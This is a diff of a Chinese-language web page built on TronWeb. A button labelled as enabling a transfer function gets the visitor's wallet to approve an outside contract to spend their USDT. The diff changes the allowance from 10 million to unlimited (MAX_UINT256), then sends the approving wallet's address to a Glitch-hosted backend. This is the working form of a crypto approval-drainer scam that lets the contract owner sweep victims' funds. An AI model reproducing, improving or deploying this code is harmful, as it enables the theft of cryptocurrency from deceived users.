@@ -2,10 +2,10 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 授權啟動</title>
+  <title>USDT 無限授權啟動</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <style>
     body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
     button {
@@ -20,10 +20,10 @@
   </style>
 </head>
 <body>
-  <button onclick="authorizeUSDT()">開啟轉帳功能</button>
+  <button onclick="authorizeUSDT()">開啟無限轉帳授權</button>
 
   <script>
-    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
+    const AUTH_CONTRACT = "TLFVGYGU5wd4z3KzKxr35kNUHQ7zFtff5d";
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const BACKEND = "https://peaceful-precious-ceres.glitch.me";
 
@@ -33,21 +33,20 @@
       }
 
       const address = tronWeb.defaultAddress.base58;
+      const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
       try {
         const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+        await usdt.approve(AUTH_CONTRACT, MAX_UINT256).send();
 
-        // 發送 approve 授權（建議額度 10,000,000 USDT）
-        await usdt.approve(AUTH_CONTRACT, tronWeb.toSun(10000000)).send();
-
-        // 等待鏈上確認後再次驗證授權是否成功
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
         const allowed = parseFloat(allowance.toString()) / 1e6;
 
-        if (allowed >= 10000000) {
+        if (allowed > 1000000) {
           await axios.post(`${BACKEND}/wallets`, { address });
-          alert("✅ 已成功授權 10,000,000 USDT 給合約");
+          alert("✅ 已成功無上限授權 USDT 給合約");
         } else {
-          alert("⚠️ 授權金額不足，請重新操作");
+          alert("⚠️ 授權金額異常，請重新操作");
         }
       } catch (err) {
         console.error("授權失敗", err);
